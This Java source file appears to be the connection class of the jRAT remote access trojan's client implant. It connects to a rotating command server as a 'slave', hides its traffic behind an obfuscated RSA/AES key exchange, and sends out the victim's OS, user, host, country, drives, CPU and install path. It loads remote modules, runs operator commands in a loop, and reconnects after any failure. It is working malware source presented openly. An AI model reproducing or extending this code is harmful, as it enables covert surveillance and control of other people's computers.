package jrat.client;

import jrat.client.modules.ModuleLoader;
import jrat.client.packets.incoming.AbstractIncomingPacket;
import jrat.client.packets.outgoing.*;
import jrat.common.ConnectionCodes;
import jrat.common.Constants;
import jrat.common.Logger;
import jrat.common.Version;
import jrat.common.crypto.Crypto;
import jrat.common.crypto.CryptoUtils;
import jrat.common.crypto.ObfuscatedStreamKeyExchanger;
import jrat.common.crypto.StreamKeyExchanger;
import jrat.common.io.StringWriter;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.PublicKey;

public class Connection implements Runnable {

	private Socket socket;
	private FrameChat frameChat;

	private InputStream inputStream;
	private OutputStream outputStream;

	private DataInputStream dis;
	private DataOutputStream dos;

	private float protocolVersion;

	public PublicKey pubKey;
	
	public void run() {
		try {
			Address address = DnsRotator.getNextAddress();

			socket = new Socket(address.getAddress(), address.getPort());

			socket.setSoTimeout(Configuration.getTimeout());

			this.inputStream = socket.getInputStream();
			this.outputStream = socket.getOutputStream();

			this.dis = new DataInputStream(inputStream);
			this.dos = new DataOutputStream(outputStream);

			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);

			this.dos.writeByte(Version.getProtocolVersion());

			StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(Main.getKeyPair(), dis, dos);
			pubKey = exchanger.readRemoteKey();
			exchanger.writePublicKey();
			
			int keylen = dis.readInt();
			int ivlenOut = dis.readInt();
			int ivlenIn = dis.readInt();

			byte[] encKey = new byte[keylen];
			byte[] bivOut = new byte[ivlenOut];
			byte[] bivIn = new byte[ivlenIn];
			dis.readFully(encKey);
			dis.readFully(bivOut);
			dis.readFully(bivIn);

			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");

			bivOut = Crypto.decrypt(bivOut, Main.getKeyPair().getPrivate(), "RSA");
			bivIn = Crypto.decrypt(bivIn, Main.getKeyPair().getPrivate(), "RSA");

			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");

			IvParameterSpec ivOut = new IvParameterSpec(bivOut);
			IvParameterSpec ivIn = new IvParameterSpec(bivIn);

			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, ivIn);
			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, ivOut);
			
			this.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
			this.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);

			this.dis = new DataInputStream(inputStream);
			this.dos = new DataOutputStream(outputStream);

            ModuleLoader.read(this);

			initialize();

			status(Constants.STATUS_READY);

			while (true) {
				short header = readShort();
				
				AbstractIncomingPacket.execute(this, header);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Thread.sleep(Configuration.getConnectionDelay() * 1000L);
				new Thread(this).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public void initialize() throws Exception {
		addToSendQueue(new Packet1InitHandshake());	
		refreshInit();		
		addToSendQueue(new Packet3Initialized());
	}
	
	public void refreshInit() {
		addToSendQueue(new Packet4InitOperatingSystem());
		addToSendQueue(new Packet5InitUserHost());	
		addToSendQueue(new Packet6InitVersion());
		addToSendQueue(new Packet7InitServerID());
		addToSendQueue(new Packet8InitCountry());
		addToSendQueue(new Packet9InitJavaVersion());
		addToSendQueue(new Packet10InitInstallPath());
		addToSendQueue(new Packet11InitInstallationDate());
		addToSendQueue(new Packet12InitLocalAddress());
		addToSendQueue(new Packet13InitTotalMemory());
		addToSendQueue(new Packet14InitAvailableCores());
		addToSendQueue(new Packet15InitJavaPath());
		addToSendQueue(new Packet17InitDrives());
		addToSendQueue(new Packet18InitMonitors());
		addToSendQueue(new Packet19InitCPU());
		addToSendQueue(new Packet20Headless());
	}

	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
		packet.send(this);
	}

	public boolean isConnected() {
		return socket.isConnected() && !socket.isClosed();
	}

	public void writeLine(String s) {
		if (s == null) {
			Logger.warn("String is null!");
			s = "";
		}
		try {
			dos.writeShort(s.length());
			dos.writeChars(s);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() {
		try {
			short len = dis.readShort();

			StringBuilder builder = new StringBuilder();
			for (int i = 0; i < len; i++) {
				builder.append(dis.readChar());
			}

			String s = builder.toString();

			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}
	
	public double readDouble() throws Exception {
		return dis.readDouble();
	}
	
	public void writeDouble(double d) throws Exception {
		dos.writeDouble(d);
	}

	public void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public void write(byte[] bytes) throws Exception {
	    dos.write(bytes);
    }

    public void write(byte[] bytes, int off, int len) throws Exception {
	    dos.write(bytes, off, len);
    }

	public void status(int status) {
		addToSendQueue(new Packet2Status(status));
	}
	
	public DataInputStream getDataInputStream() {
		return dis;
	}
	
	public DataOutputStream getDataOutputStream() {
		return dos;
	}
	
	public void setFrameChat(FrameChat frame) {
		this.frameChat = frame;
	}
	
	public FrameChat getFrameChat() {
		return this.frameChat;
	}

	public Socket getSocket() {
		return this.socket;
	}
	
	public StringWriter getStringWriter() {
		return new StringWriter() {
			@Override
			public void writeLine(String s) throws Exception {
				Connection.this.writeLine(s);
			}
		};
	}
}
